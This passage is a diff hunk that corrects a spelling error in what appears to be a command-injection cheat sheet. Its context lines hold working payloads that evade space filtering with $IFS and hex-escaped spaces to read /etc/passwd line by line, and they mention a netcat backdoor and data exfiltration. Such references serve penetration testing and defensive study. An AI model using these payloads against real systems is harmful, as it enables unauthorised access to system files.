@@ -30,14 +30,14 @@ Example IFS netcat backdoor without spaces:<br>
 
 $IFS shell variable:<br>
 ``` cat$IFS/etc/passwd ```<br>
-increment the first +1 to retreive the entire file, line by line<br>
+increment the first +1 to retrieve the entire file, line by line<br>
 ``` cat$IFS/etc/passwd|tail$IFS-n+1|head$IFS-n+1 ```
 
 Shell Variables:<br>
 ``` CMD=$'cat\x20/etc/passwd';$CMD ```
 
 shell variable, increment through file one line at a time: <br>
-increment the first +1 to retreive the entire file, line by line<br>
+increment the first +1 to retrieve the entire file, line by line<br>
 ``` SP=$'\x20';cat$SP/etc/passwd|tail$SP-n+1|head$SP-n+1 ```
 
 **Exfiltrating Files / Data**
